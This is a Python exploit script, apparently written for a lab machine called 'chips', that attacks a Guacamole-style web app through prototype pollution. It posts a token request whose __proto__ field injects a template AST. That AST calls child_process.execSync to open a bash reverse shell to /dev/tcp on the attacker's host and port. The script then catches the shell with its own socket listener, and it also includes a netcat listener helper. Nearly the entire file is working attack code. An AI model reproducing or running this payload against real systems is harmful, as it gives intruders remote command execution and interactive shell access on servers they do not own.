import urllib3
import requests
import json
import subprocess
import os
import sys
import threading
import socket
import time

s = requests.session()
headers = { "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }


def listen(ip,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, int(port)))
	s.listen(1)
	print("[+] Reverse shell listening on port " + str(port))
	conn, addr = s.accept()
	print('[+] Connection received from ',addr)
	conn.send("echo ' '\n".encode())
	conn.recv(8192).decode()
	conn.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\");'\n".encode())
	sys.stdout.write(conn.recv(8192).decode())
	while True:
		command = input()
		if command == "exit":
			conn.send("exit\n\exit\n".encode())
			conn.recv(8192).decode()
			conn.close()
			sys.exit()
		#Send command
		command += "\n"
		conn.send(command.encode())
		time.sleep(0.5)
		sys.stdout.write("\033[A" + conn.recv(8192).decode())

def extract_token(json_string):
    data = json.loads(json_string)
    token = data.get('token')
    return token

def startListener(port):
    try:
        # Uruchomienie listenera netcat w nowym terminalu
        command = f"terminator -e 'nc -nlvp {port}; exec bash'"
        process = subprocess.Popen(command, shell=True)
        print(f"Netcat listener started on port {port} in a new terminal.")
        return process
    except Exception as e:
        print(f"Failed to start netcat listener: {e}")
        return None


def generateToken(lhost, lport, rhost):
    url = f"http://{rhost}/token"
    data = {
        "connection": {
            "type": "rdp",
            "settings": {
                "hostname": "rdesktop",
                "username": "abc",
                "password": "abc",
                "port": "3389",
                "security": "any",
                "ignore-cert": "true",
                "client-name": "",
                "console": "false",
                "initial-program": "",
                "__proto__": 
                {
                "type": "Program",
                "body":[
                    {
                    "type": "MustacheStatement",
                    "path":0,
                    "loc": 0,
                    "params":[
                        {
                        "type": "NumberLiteral",
                        "value": f"console.log(process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`).toString())" 
                        } 
                    ]
                    }
                ]
                }
            }
        }
    }

    response = requests.post(url,  json=data)
    token = extract_token(response.text)
    print(token)
    return token

def sendToken(rhost, token):
    url = f"http://{rhost}/guaclite"
    params = {
        "token": f"{token}"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": "http://chips/",
        "Upgrade-Insecure-Requests": "1"
    }

    response = requests.get(url, headers=headers, params=params)
    return response

def sendRequest():
    url = "http://chips"
    response = requests.get(url)
    return response


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT> <WEBPORT>\n".format(sys.argv[0]))
        print("(+) RHOST - Remote server which runs vulnerable version of CHIPS")
        print("(+) RPORT - Remote application port")
        print("(+) LHOST - Local IP Address to get shell")
        print("(+) LPORT - Local Port to get shell\n")
        sys.exit(-1)

    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
        
    listener_thread = threading.Thread(target=listen, args=(lhost, lport))

    #startListener(LPORT)
    token = generateToken(lhost, lport, rhost)
    sendToken(rhost, token)

    listener_thread.start()
    sendRequest()
    listener_thread.join()


